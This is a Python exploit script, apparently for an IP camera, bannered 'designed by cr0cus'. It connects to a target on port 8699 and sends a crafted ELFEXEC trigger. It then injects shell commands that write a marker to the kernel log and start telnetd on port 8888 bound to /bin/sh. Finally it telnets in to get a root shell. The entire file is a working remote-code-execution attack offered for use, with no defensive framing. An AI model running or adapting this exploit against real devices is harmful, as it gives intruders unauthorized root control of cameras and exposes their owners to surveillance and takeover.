import socket
import sys
import os
import time 


TARGET_IP = '192.168.1.104'
TARGET_PORT = 8699 
TRIGGER_ELFEXEC="<ELFEXEC><FNAME>exploit</FNAME><FSIZE>34</FSIZE></ELFEXEC>"

payload_sled = "echo pwned_by_cr0cus > /dev/kmsg\n"
main_payload = "telnetd -p 8888 -l /bin/sh &"

os.system("clear")

print(r"""

 $$$$$$\  $$$$$$$\   $$$$$$\
$$  __$$\ $$  __$$\ $$ ___$$\
$$ /  \__|$$ |  $$ |\_/   $$ |        $$$$$$\  $$\  $$\  $$\ $$$$$$$\
$$ |      $$$$$$$  |  $$$$$ /        $$  __$$\ $$ | $$ | $$ |$$  __$$\
$$ |      $$  ____/   \___$$\        $$ /  $$ |$$ | $$ | $$ |$$ |  $$ |
$$ |  $$\ $$ |      $$\   $$ |       $$ |  $$ |$$ | $$ | $$ |$$ |  $$ |
\$$$$$$  |$$ |      \$$$$$$  |       $$$$$$$  |\$$$$$\$$$$  |$$ |  $$ |
 \______/ \__|       \______/$$$$$$\ $$  ____/  \_____\____/ \__|  \__|
                             \______|$$ |
                                     $$ |
                                     \__|

      designed by cr0cus
""")

if __name__ == "__main__":
    try:
        print(" [+] Connecting to a target ")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))

        time.sleep(2)


        print(" [+] Sending a payload to target ")
        s.send(TRIGGER_ELFEXEC.encode())
        time.sleep(1)

        s.send(payload_sled.encode())
        time.sleep(1)

        s.send(main_payload.encode())
        time.sleep(2)
        data = s.recv(1024)
        print(f"{data}")
        
        print(" [+] Connecting to the camera as a root... ")
        time.sleep(1)
        os.system("telnet %s %s " % (TARGET_IP, 8888))
    except:
        print("failed")
